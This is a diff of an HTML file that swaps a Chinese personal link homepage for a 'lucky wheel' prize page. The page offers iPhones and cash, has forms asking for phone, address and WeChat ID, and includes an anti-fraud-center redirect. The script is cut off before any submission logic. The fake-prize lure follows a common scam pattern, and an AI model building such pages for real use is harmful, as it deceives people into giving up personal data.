@@ -1,735 +1,887 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="renderer" content="webkit">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <script type="text/javascript" src="/static/pixi.min.js"></script>
-  <script type="text/javascript" src="/static/main.js"></script>
-  <link rel="stylesheet" href="/static/font.css">
-  <!-- 引入Font Awesome图标库 -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <title>小清墨の个人主页</title>
-  <style>
-    canvas {
-      display: block;
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: -2;
-      pointer-events: none
-    }
-    
-    a:hover,
-    a:link,
-    a:visited,
-    a:active,
-    a:focus {
-        text-decoration: none;
-    }
-
-    button,
-    input,
-    input:focus {
-        outline: none;
-        border: none;
-    }
-
-    a,
-    button,
-    input {
-        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
-    }
-    
-    *{
-      -webkit-user-select: none; /* Safari */
-      -moz-user-select: none; /* Firefox */
-      -ms-user-select: none; /* Internet Explorer/Edge */
-      user-select: none; /* 其他浏览器 */
-    }
-
-    * {
-      box-sizing: border-box;
-      -webkit-text-size-adjust: none
-    }
-
-    img {
-      border: 0;
-      vertical-align: middle
-    }
-
-    body {
-      margin: 0;
-      padding: 0;
-      border: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      width: 100vw;
-      background: radial-gradient(#619bff, #e0e0e3);
-    }
-
-    .main {
-      width: 40%;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 20px 0;
-    }
-
-    @media screen and (max-width:1024px) {
-      .main {
-        width: 50%;
-      }
-    }
-
-    @media screen and (max-width:768px) {
-      .main {
-        width: 55%;
-      }
-    }
-
-    @media screen and (max-width:540px) {
-      .main {
-        width: 65% !important;
-      }
-    }
-
-    @media screen and (max-width:480px) {
-      .main {
-        width: 90% !important;
-      }
-    }
-
-    @media screen and (max-width:360px) {
-      .main {
-        width: 95% !important;
-      }
-    }
-
-    h1 {
-      font-family: 'Noto Serif SC', serif;
-      color: #fff;
-      font-size: 2.2rem;
-      line-height: 2em;
-      font-weight: 800;
-      text-align: center;
-      margin: 20px 0 10px 0;
-    }
-
-    h2 {
-      margin: 0;
-      color: #ffffffa3;
-      padding-bottom: 20px;
-      font-size: 18px;
-      text-align: center;
-    }
-
-    /* 时间显示样式 */
-    .time-display {
-      margin: 15px 0 15px 0;
-      font-family: 'Noto Serif SC', serif;
-      color: rgba(255, 255, 255, 0.9);
-      font-size: 1.2rem;
-      text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
-      letter-spacing: 1px;
-      text-align: center;
-    }
-
-    /* 哔哩哔哩图标样式 - 缩小尺寸 */
-    .bilibili-icon {
-      margin: 10px 0 25px 0;
-      text-align: center;
-    }
-    
-    .bilibili-icon a {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 40px;
-      height: 40px;
-      background: linear-gradient(135deg, #fb7299, #ff85b2);
-      color: white;
-      font-size: 1.4rem;
-      border-radius: 50%;
-      text-decoration: none;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 12px rgba(251, 114, 153, 0.4);
-      border: 2px solid rgba(255, 255, 255, 0.3);
-      position: relative;
-      overflow: hidden;
-    }
-    
-    .bilibili-icon a:hover {
-      transform: translateY(-2px) scale(1.08);
-      box-shadow: 0 6px 20px rgba(251, 114, 153, 0.6);
-      background: linear-gradient(135deg, #ff85b2, #fb7299);
-      border-color: rgba(255, 255, 255, 0.6);
-    }
-    
-    .bilibili-icon a:active {
-      transform: translateY(1px) scale(1.03);
-    }
-    
-    .bilibili-icon a::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-      transition: left 0.5s ease;
-    }
-    
-    .bilibili-icon a:hover::before {
-      left: 100%;
-    }
-    
-    .bilibili-icon a i {
-      position: relative;
-      z-index: 1;
-      text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-    }
-
-    /* 链接列表容器 */
-    .link-container {
-      width: 100%;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-top: 10px;
-    }
-
-    ul {
-      margin: 0;
-      padding: 0;
-      position: relative;
-      list-style-type: none;
-      width: 100%;
-      max-width: 90%;
-      border-bottom: 2px solid hsla(0, 0%, 100%, .1);
-      border-top: 2px solid hsla(0, 0%, 100%, .1);
-      display: grid; /* 使用grid布局 */
-      grid-template-columns: repeat(4, 1fr); /* 4个等宽列 */
-      grid-template-rows: auto; /* 自动行高 */
-      gap: 0; /* 无间隙 */
-      align-items: stretch; /* 拉伸项目填满行高 */
-    }
-
-    li {
-      display: flex;
-      transition: all .2s;
-      border-left: 1px solid hsla(0, 0%, 100%, .1);
-      border-right: 1px solid hsla(0, 0%, 100%, .1);
-      height: auto; /* 改为自动高度 */
-      min-height: 50px; /* 最小高度 */
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden; /* 防止内容溢出 */
-      padding: 5px; /* 添加内边距 */
-    }
-
-    /* 移除第一个和最后一个项目的边框 */
-    li:first-child {
-      border-left: none;
-    }
-    
-    li:last-child {
-      border-right: none;
-    }
-
-    /* 链接基础样式 */
-    a {
-      font-size: 1.2rem;
-      color: #ffffff;
-      transition: all .2s;
-      cursor: pointer;
-      text-decoration: none;
-    }
-
-    a:hover {
-      color: #fff !important;
-      text-shadow:0 0px 20px  #ffffff;
-    }
-
-    /* 链接按钮增强样式 - 修复文字换行问题 */
-    li a {
-      position: relative;
-      overflow: visible; /* 改为可见以允许文字换行 */
-      padding: 8px 6px; /* 调整内边距 */
-      border-radius: 6px;
-      transition: all 0.3s ease;
-      white-space: normal; /* 允许换行 */
-      word-break: break-word; /* 允许单词内换行 */
-      word-wrap: break-word; /* 长单词换行 */
-      text-align: center; /* 文字居中 */
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      width: 100%; /* 确保宽度填满容器 */
-      box-sizing: border-box;
-      font-size: 0.95rem; /* 稍微减小字体大小 */
-      font-weight: 500;
-      line-height: 1.4; /* 增加行高，改善多行文本显示 */
-      min-height: 40px; /* 最小高度确保按钮有足够空间 */
-      height: auto; /* 自动高度 */
-    }
-    
-    /* 为所有链接的span元素设置样式 */
-    li a span {
-      display: block;
-      width: 100%;
-      text-align: center;
-    }
-    
-    /* 针对移动端调整grid布局 */
-    @media screen and (max-width: 768px) {
-      ul {
-        grid-template-columns: repeat(2, 1fr); /* 中等屏幕：2列 */
-        grid-template-rows: repeat(2, auto); /* 2行 */
-        max-width: 95%;
-      }
-      
-      li a {
-        font-size: 0.9rem;
-        padding: 7px 4px;
-        min-height: 45px; /* 移动端增加最小高度 */
-      }
-      
-      /* 调整移动端的边框 */
-      li:nth-child(odd) {
-        border-left: none;
-      }
-      
-      li:nth-child(even) {
-        border-right: none;
-      }
-      
-      /* 第一行的项目 */
-      li:nth-child(1),
-      li:nth-child(2) {
-        border-bottom: 1px solid hsla(0, 0%, 100%, .1);
-      }
-    }
-    
-    /* 针对小屏幕手机调整 */
-    @media screen and (max-width: 480px) {
-      ul {
-        grid-template-columns: 1fr; /* 小屏幕：1列 */
-        grid-template-rows: repeat(4, auto); /* 4行 */
-        max-width: 100%;
-      }
-      
-      li a {
-        font-size: 0.85rem;
-        padding: 6px 3px;
-        min-height: 40px;
-      }
-      
-      /* 移除所有左右边框，只保留上下边框 */
-      li {
-        border-left: none;
-        border-right: none;
-        border-bottom: 1px solid hsla(0, 0%, 100%, .1);
-      }
-      
-      li:last-child {
-        border-bottom: none;
-      }
-      
-      li:first-child {
-        border-top: none;
-      }
-    }
-    
-    li a::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-      transition: left 0.5s ease;
-    }
-    
-    li a:hover::before {
-      left: 100%;
-    }
-    
-    li:nth-child(1) a:hover {
-      background: rgba(30, 144, 255, 0.2);
-      box-shadow: 0 0 12px rgba(30, 144, 255, 0.5);
-    }
-    
-    li:nth-child(2) a:hover {
-      background: rgba(50, 205, 50, 0.2);
-      box-shadow: 0 0 12px rgba(50, 205, 50, 0.5);
-    }
-    
-    li:nth-child(3) a:hover {
-      background: rgba(255, 69, 0, 0.2);
-      box-shadow: 0 0 12px rgba(255, 69, 0, 0.5);
-    }
-    
-    li:nth-child(4) a:hover {
-      background: rgba(138, 43, 226, 0.2);
-      box-shadow: 0 0 12px rgba(138, 43, 226, 0.5);
-    }
-
-    /* VPN链接样式 */
-    .vpn-link {
-      margin-top: 25px;
-      text-align: center;
-      width: 100%;
-    }
-    
-    .vpn-link a {
-      font-size: 0.9rem;
-      color: rgba(255, 255, 255, 0.7);
-      text-decoration: none;
-      transition: all .3s;
-      padding: 5px 12px;
-      border-radius: 12px;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      display: inline-block;
-      max-width: 90%;
-      word-break: break-word;
-      white-space: normal;
-      line-height: 1.4;
-    }
-    
-    .vpn-link a:hover {
-      color: #ffffff;
-      background: rgba(255, 255, 255, 0.1);
-      text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-    }
-
-    /* QQ群样式 */
-    .qq-group {
-      margin-top: 30px;
-      text-align: center;
-      width: 100%;
-      padding: 20px;
-      background: rgba(255, 255, 255, 0.08);
-      border-radius: 15px;
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      backdrop-filter: blur(5px);
-    }
-    
-    .qq-group-title {
-      color: #ffffff;
-      font-size: 1.1rem;
-      margin-bottom: 15px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-    }
-    
-    .qq-group-content {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 15px;
-    }
-    
-    .qrcode-img {
-      width: 160px;
-      height: 160px;
-      border-radius: 10px;
-      background-color: white;
-      padding: 10px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-      border: 1px solid rgba(255, 255, 255, 0.3);
-      overflow: hidden;
-    }
-    
-    .qrcode-img img {
-      width: 100%;
-      height: 100%;
-      border-radius: 5px;
-      object-fit: cover;
-    }
-    
-    .qq-group-info {
-      width: 100%;
-    }
-    
-    .qq-group-number {
-      font-size: 1.6rem;
-      font-weight: 700;
-      color: #ffffff;
-      text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
-      letter-spacing: 1px;
-      margin: 10px 0;
-      font-family: 'Courier New', monospace;
-      padding: 8px 15px;
-      background: rgba(0, 0, 0, 0.2);
-      border-radius: 8px;
-      display: inline-block;
-    }
-    
-    .qq-group-desc {
-      color: rgba(255, 255, 255, 0.7);
-      font-size: 0.85rem;
-      margin-top: 8px;
-      line-height: 1.5;
-    }
-    
-    .qq-group-icon {
-      color: #fff;
-      font-size: 1.2rem;
-    }
-    
-    /* 友情链接样式 */
-    .friends-section {
-      margin-top: 30px;
-      width: 100%;
-      text-align: center;
-    }
-    
-    .friends-title {
-      color: #ffffff;
-      font-size: 1.2rem;
-      margin-bottom: 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-    }
-    
-    .friends-title i {
-      color: #ffd700;
-      font-size: 1.3rem;
-    }
-    
-    .friends-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 15px;
-      width: 100%;
-    }
-    
-    .friend-link-item {
-      width: 100%;
-      max-width: 500px;
-      background: rgba(255, 255, 255, 0.08);
-      border-radius: 12px;
-      padding: 15px;
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      transition: all 0.3s ease;
-      backdrop-filter: blur(5px);
-      text-decoration: none;
-      display: block;
-    }
-    
-    .friend-link-item:hover {
-      transform: translateY(-3px);
-      background: rgba(255, 255, 255, 0.12);
-      border-color: rgba(255, 255, 255, 0.3);
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
-    }
-    
-    .link-content {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      text-decoration: none;
-    }
-    
-    .link-logo {
-      width: 60px;
-      height: 60px;
-      border-radius: 10px;
-      object-fit: cover;
-      border: 2px solid rgba(255, 255, 255, 0.2);
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-      flex-shrink: 0;
-    }
-    
-    .link-info {
-      flex: 1;
-      text-align: left;
-    }
-    
-    .link-title {
-      color: #ffffff;
-      font-size: 1.1rem;
-      margin: 0 0 8px 0;
-      font-weight: 600;
-      text-decoration: none;
-    }
-    
-    .link-desc {
-      color: rgba(255, 255, 255, 0.7);
-      font-size: 0.85rem;
-      margin: 0;
-      line-height: 1.4;
-      text-decoration: none;
-    }
-    
-    /* 横屏适配：当有足够空间时 */
-    @media screen and (min-width: 768px) {
-      .qq-group-content {
-        flex-direction: row;
-        justify-content: center;
-        gap: 25px;
-      }
-      
-      .qq-group-info {
-        width: auto;
-        text-align: left;
-      }
-      
-      .qrcode-img {
-        width: 140px;
-        height: 140px;
-      }
-      
-      .friends-container {
-        flex-direction: row;
-        flex-wrap: wrap;
-        justify-content: center;
-      }
-      
-      .friend-link-item {
-        width: calc(50% - 10px);
-        max-width: 400px;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>幸运大转盘</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Microsoft YaHei', sans-serif;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #fff;
+            overflow-x: hidden;
+        }
+        .container {
+            text-align: center;
+            max-width: 900px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 2;
+        }
+        h1 {
+            font-size: 42px;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(to right, #ff9966, #ff5e62);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: bold;
+        }
+        .content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+        .wheel-container {
+            flex: 1;
+            min-width: 300px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .wheel {
+            width: 300px;
+            height: 300px;
+            position: relative;
+            border-radius: 50%;
+            overflow: hidden;
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.83, 0.67);
+            transform: rotate(0deg);
+            box-shadow: 0 0 0 10px #ffd700, 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+        .wheel-section {
+            position: absolute;
+            width: 50%;
+            height: 50%;
+            transform-origin: bottom right;
+            left: 0;
+            top: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding-left: 60px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 14px;
+            color: #333;
+            text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.5);
+            clip-path: polygon(0 0, 100% 0, 100% 100%, 0% 100%);
+        }
+        .wheel-section:nth-child(1) {
+            background-color: #ff9999;
+            transform: rotate(0deg);
+        }
+        .wheel-section:nth-child(2) {
+            background-color: #99ff99;
+            transform: rotate(60deg);
+        }
+        .wheel-section:nth-child(3) {
+            background-color: #9999ff;
+            transform: rotate(120deg);
+        }
+        .wheel-section:nth-child(4) {
+            background-color: #ffff99;
+            transform: rotate(180deg);
+        }
+        .wheel-section:nth-child(5) {
+            background-color: #ff99ff;
+            transform: rotate(240deg);
+        }
+        .wheel-section:nth-child(6) {
+            background-color: #99ffff;
+            transform: rotate(300deg);
+        }
+        /* 指针样式 - 修改为指向中心 */
+        .pointer {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            z-index: 10;
+        }
+        .pointer::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(45deg);
+            width: 0;
+            height: 0;
+            border-left: 20px solid transparent;
+            border-right: 20px solid transparent;
+            border-bottom: 30px solid #ff3300;
+        }
+        .pointer::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 20px;
+            height: 20px;
+            background-color: #ff3300;
+            border-radius: 50%;
+            z-index: 11;
+        }
+        .center-logo {
+            position: absolute;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            border: 4px solid #ffd700;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            font-size: 12px;
+            text-align: center;
+            line-height: 1.2;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .center-logo:hover {
+            transform: translate(-50%, -50%) scale(1.05);
+        }
+        .center-logo:active {
+            transform: translate(-50%, -50%) scale(0.95);
+        }
+        .spin-button {
+            background: linear-gradient(to right, #ff9966, #ff5e62);
+            border: none;
+            padding: 15px 40px;
+            font-size: 20px;
+            color: white;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        .spin-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(to right, #ff5e62, #ff9966);
+        }
+        .spin-button:active {
+            transform: translateY(1px);
+        }
+        .spin-button:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+        .result {
+            margin-top: 30px;
+            font-size: 26px;
+            min-height: 40px;
+            font-weight: bold;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .note {
+            margin-top: 20px;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        .prize-image {
+            flex: 1;
+            min-width: 300px;
+            max-width: 400px;
+            display: none;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 3px solid #ffd700;
+        }
+        .music-control {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 10;
+            backdrop-filter: blur(5px);
+        }
+        .music-control i {
+            font-size: 20px;
+            color: white;
+        }
+        .counter {
+            margin-top: 15px;
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        .redirect-notice {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #ffeb3b;
+            display: none;
+        }
+        .limit-notice {
+            margin-top: 15px;
+            font-size: 18px;
+            color: #ff5252;
+            font-weight: bold;
+            display: none;
+        }
+        .dev-mode-notice {
+            margin-top: 15px;
+            font-size: 18px;
+            color: #4caf50;
+            font-weight: bold;
+            display: none;
+        }
+        .dev-mode-count {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: white;
+            display: none;
+        }
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #f00;
+            opacity: 0.7;
+            border-radius: 0;
+            z-index: 1;
+        }
+        /* 信息收集表单样式 */
+        .info-form {
+            display: none;
+            background: rgba(255, 255, 255, 0.15);
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+            backdrop-filter: blur(10px);
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+        }
+        .form-title {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #ffeb3b;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+        }
+        .submit-btn {
+            background: linear-gradient(to right, #4CAF50, #8BC34A);
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            color: white;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        .success-message {
+            color: #4CAF50;
+            font-weight: bold;
+            margin-top: 15px;
+            display: none;
+        }
+        .error-message {
+            color: #ff5252;
+            font-weight: bold;
+            margin-top: 15px;
+            display: none;
+        }
+        @keyframes fall {
+            from { transform: translateY(-100px) rotate(0deg); }
+            to { transform: translateY(1000px) rotate(360deg); opacity: 0; }
+        }
+        @media (max-width: 768px) {
+            .content {
+                flex-direction: column;
+            }
+            .wheel {
+                width: 250px;
+                height: 250px;
+            }
+            .wheel-section {
+                font-size: 12px;
+                padding-left: 50px;
+            }
+            .center-logo {
+                width: 50px;
+                height: 50px;
+                font-size: 10px;
+            }
+            .pointer {
+                width: 35px;
+                height: 35px;
+            }
+            .pointer::before {
+                border-left: 15px solid transparent;
+                border-right: 15px solid transparent;
+                border-bottom: 25px solid #ff3300;
+            }
+            .pointer::after {
+                width: 15px;
+                height: 15px;
+            }
+        }
+    </style>
 </head>
-
 <body>
-  <div class="main">
-    <h1>小清墨の个人主页</h1>
-    <h2>技术交流 · 资源共享</h2>
-    
-    <!-- 时间显示区域 -->
-    <div class="time-display" id="current-time"></div>
-    
-    <!-- 哔哩哔哩图标按钮 -->
-    <div class="bilibili-icon">
-      <a href="https://space.bilibili.com/3546845185838054" target="_blank" title="哔哩哔哩个人空间">
-        <i class="fab fa-bilibili"></i>
-      </a>
-    </div>
-
-    <!-- 链接容器 -->
-    <div class="link-container">
-      <ul>
-        <li><a href="https://xqmdns.indevs.in" target="_blank"><span>免费域名1</span></a></li>
-        <li><a href="https://dns.xhem.top" target="_blank"><span>免费域名2</span></a></li>
-        <li><a href="https://api1.indevs.in" target="_blank"><span>免费API</span></a></li>
-        <li><a href="https://xhost.indevs.in" target="_blank"><span>免费托管</span></a></li>
-      </ul>
-    </div>
-
-    <!-- VPN链接 -->
-    <div class="vpn-link">
-      <a href="https://api1.indevs.in/vpn" target="_blank">美国VPN加速服务</a>
-    </div>
-    
-    <!-- QQ群信息（带二维码） -->
-    <div class="qq-group">
-      <div class="qq-group-title">
-        <i class="fab fa-qq qq-group-icon"></i> 技术交流QQ群
-      </div>
-      
-      <div class="qq-group-content">
-        <!-- 二维码 -->
-        <div class="qrcode-img">
-          <img src="xqm.png" alt="QQ群二维码">
+    <div class="container">
+        <div class="music-control" id="musicControl">
+            <i>🔊</i>
         </div>
         
-        <!-- 群号信息 -->
-        <div class="qq-group-info">
-          <div class="qq-group-number">1072402703</div>
-          <p class="qq-group-desc">扫描二维码或搜索群号加入<br>获取最新资源更新和技术支持</p>
-        </div>
-      </div>
-    </div>
-    
-    <!-- 友情链接部分 -->
-    <div class="friends-section">
-      <div class="friends-title">
-        <i class="fas fa-handshake"></i> 友情链接
-      </div>
-      
-      <div class="friends-container">
-        <a href="https://ppkjgzs.top/" target="_blank" rel="noopener noreferrer" class="friend-link-item">
-          <div class="link-content">
-            <img src="https://ppkjgzs.top/images/logo.jpeg" alt="平平的小破站" class="link-logo">
-            <div class="link-info">
-              <h3 class="link-title">平平的小破站</h3>
-              <p class="link-desc">一个分享编程知识和技术教程的个人博客网站，涵盖前端开发、Python编程等内容。</p>
-            </div>
-          </div>
-        </a>
+        <h1>幸运大转盘</h1>
         
-        <!-- 可以在这里添加更多友情链接 -->
-        <!--
-        <a href="https://example.com/" target="_blank" rel="noopener noreferrer" class="friend-link-item">
-          <div class="link-content">
-            <img src="https://example.com/logo.jpg" alt="网站名称" class="link-logo">
-            <div class="link-info">
-              <h3 class="link-title">网站名称</h3>
-              <p class="link-desc">网站描述内容</p>
+        <div class="content">
+            <div class="wheel-container">
+                <div class="pointer"></div>
+                <div class="wheel" id="wheel">
+                    <div class="wheel-section">14 Pro max</div>
+                    <div class="wheel-section">加入qq群</div>
+                    <div class="wheel-section">国家反诈中心</div>
+                    <div class="wheel-section">2025元</div>
+                    <div class="wheel-section">16 Pro max</div>
+                    <div class="wheel-section">15 Pro max</div>
+                    <div class="center-logo" id="centerLogo">幸运<br>抽奖</div>
+                </div>
             </div>
-          </div>
-        </a>
-        -->
-      </div>
+            
+            <img id="qq-image" class="prize-image" src="https://via.placeholder.com/400x300/ff9999/333333?text=QQ群二维码" alt="QQ群二维码">
+        </div>
+        
+        <!-- 收货信息表单 -->
+        <div class="info-form" id="addressForm">
+            <div class="form-title">请填写收货信息</div>
+            <div class="form-group">
+                <label for="phone">手机号</label>
+                <input type="tel" id="phone" placeholder="请输入您的手机号">
+            </div>
+            <div class="form-group">
+                <label for="address">收货地址</label>
+                <input type="text" id="address" placeholder="请输入您的收货地址">
+            </div>
+            <button class="submit-btn" id="submitAddress">提交信息</button>
+            <div class="success-message" id="addressSuccess">信息提交成功！</div>
+            <div class="error-message" id="addressError">提交失败，请重试</div>
+        </div>
+        
+        <!-- 中奖信息表单 -->
+        <div class="info-form" id="winnerForm">
+            <div class="form-title">恭喜您中奖！请填写联系方式</div>
+            <div class="form-group">
+                <label for="winnerPhone">手机号</label>
+                <input type="tel" id="winnerPhone" placeholder="请输入您的手机号">
+            </div>
+            <div class="form-group">
+                <label for="wechat">微信号</label>
+                <input type="text" id="wechat" placeholder="请输入您的微信号">
+            </div>
+            <button class="submit-btn" id="submitWinner">提交信息</button>
+            <div class="success-message" id="winnerSuccess">信息提交成功！</div>
+            <div class="error-message" id="winnerError">提交失败，请重试</div>
+        </div>
+        
+        <button class="spin-button" id="spin">开始抽奖</button>
+        
+        <div class="result" id="result"></div>
+        <div class="redirect-notice" id="redirectNotice">即将跳转到国家反诈中心官方网站...</div>
+        <div class="limit-notice" id="limitNotice">今日抽奖次数已达上限，请明天再来！</div>
+        <div class="dev-mode-notice" id="devModeNotice">开发者模式已激活！无限次数可用！</div>
+        
+        <div class="counter">今日抽奖次数: <span id="counter">0</span>/5</div>
+        <div class="dev-mode-count" id="devModeCount">点击次数: 0/5</div>
+        
+        <div class="note">注：抽奖结果以转盘最终指向为准，概率不对外公开</div>
     </div>
-  </div>
+
+    <audio id="bgMusic" loop>
+        <source src="lge.mp3" type="audio/mp3">
+        您的浏览器不支持音频元素。
+    </audio>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const wheel = document.getElementById('wheel');
+            const spinButton = document.getElementById('spin');
+            const result = document.getElementById('result');
+            const qqImage = document.getElementById('qq-image');
+            const bgMusic = document.getElementById('bgMusic');
+            const musicControl = document.getElementById('musicControl');
+            const counterEl = document.getElementById('counter');
+            const redirectNotice = document.getElementById('redirectNotice');
+            const limitNotice = document.getElementById('limitNotice');
+            const devModeNotice = document.getElementById('devModeNotice');
+            const devModeCount = document.getElementById('devModeCount');
+            const centerLogo = document.getElementById('centerLogo');
+            
+            // 表单相关元素
+            const addressForm = document.getElementById('addressForm');
+            const winnerForm = document.getElementById('winnerForm');
+            const submitAddressBtn = document.getElementById('submitAddress');
+            const submitWinnerBtn = document.getElementById('submitWinner');
+            const addressSuccess = document.getElementById('addressSuccess');
+            const addressError = document.getElementById('addressError');
+            const winnerSuccess = document.getElementById('winnerSuccess');
+            const winnerError = document.getElementById('winnerError');
+            
+            let spinning = false;
+            let musicPlaying = false;
+            let devMode = localStorage.getItem('devMode') === 'true';
+            let clickCount = 0;
+            let lastClickTime = 0;
+            let currentPrize = null;
+            
+            // 国家反诈中心官方网址
+            const antifraudWebsite = "https://cyberpolice.mps.gov.cn/";
+            
+            // 获取设备唯一标识
+            function getDeviceId() {
+                let deviceId = localStorage.getItem('deviceId');
+                if (!deviceId) {
+                    deviceId = 'device_' + Math.random().toString(36).substr(2, 9);
+                    localStorage.setItem('deviceId', deviceId);
+                }
+                return deviceId;
+            }
+            
+            // 获取和保存抽奖次数
+            function getSpinCount() {
+                // 开发者模式无限次数
+                if (devMode) return 0;
+                
+                const deviceId = getDeviceId();
+                const today = new Date().toLocaleDateString();
+                const data = JSON.parse(localStorage.getItem('spinData') || '{}');
+                
+                if (data.deviceId === deviceId && data.date === today) {
+                    return data.count || 0;
+                }
+                return 0;
+            }
+            
+            function saveSpinCount(count) {
+                // 开发者模式不保存次数
+                if (devMode) return;
+                
+                const deviceId = getDeviceId();
+                const today = new Date().toLocaleDateString();
+                const data = {
+                    deviceId: deviceId,
+                    date: today,
+                    count: count
+                };
+                localStorage.setItem('spinData', JSON.stringify(data));
+            }
+            
+            // 初始化抽奖次数
+            let spinCounter = getSpinCount();
+            counterEl.textContent = spinCounter;
+            
+            // 检查是否达到每日上限
+            function checkDailyLimit() {
+                // 开发者模式无限制
